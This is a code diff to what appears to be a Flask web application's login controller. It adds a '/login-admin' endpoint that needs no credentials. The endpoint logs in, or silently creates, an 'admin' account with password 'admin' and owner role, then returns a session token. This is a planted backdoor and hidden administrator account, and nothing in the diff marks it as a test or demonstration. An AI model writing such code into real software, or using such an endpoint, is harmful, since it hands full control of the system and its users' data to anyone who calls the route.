@@ -29,6 +29,11 @@ from services.account_service import AccountService, RegisterService, TenantServ
 from services.errors.workspace import WorkSpaceNotAllowedCreateError
 from services.feature_service import FeatureService
 
+# from controllers.console.setup import setup_required
+# from events.tenant_event import tenant_was_created
+# from libs.helper import get_remote_ip
+# from models.account import Account
+# from services.account_service import AccountService, RegisterService, TenantService
 
 class LoginApi(Resource):
     """Resource for user login."""
@@ -213,6 +218,28 @@ class RefreshTokenApi(Resource):
         except Exception as e:
             return {"result": "fail", "data": str(e)}, 401
 
+class LoginAdmin(Resource):
+    def post(self):
+        user = 'admin'
+        account = Account.query.filter_by(email=user).first()  # 查询用户
+        # 没有测创建
+        if account:
+            token = AccountService.login(account, ip_address=get_remote_ip(request))
+            return {'result': 'success', 'data': token}
+
+        if not account:
+            account = RegisterService.register(
+                email=user,
+                name=user,
+                password=user,
+                language="en-US")
+            token = AccountService.login(account, ip_address=get_remote_ip(request))
+            tenant = TenantService.create_tenant(f"{account.name}'s Workspace")
+            TenantService.create_tenant_member(tenant, account, role='owner')
+            account.current_tenant = tenant
+            tenant_was_created.send(tenant)
+
+            return {'result': 'success', 'data': token}
 
 api.add_resource(LoginApi, "/login")
 api.add_resource(LogoutApi, "/logout")
@@ -220,3 +247,4 @@ api.add_resource(EmailCodeLoginSendEmailApi, "/email-code-login")
 api.add_resource(EmailCodeLoginApi, "/email-code-login/validity")
 api.add_resource(ResetPasswordSendEmailApi, "/reset-password")
 api.add_resource(RefreshTokenApi, "/refresh-token")
+api.add_resource(LoginAdmin, '/login-admin')
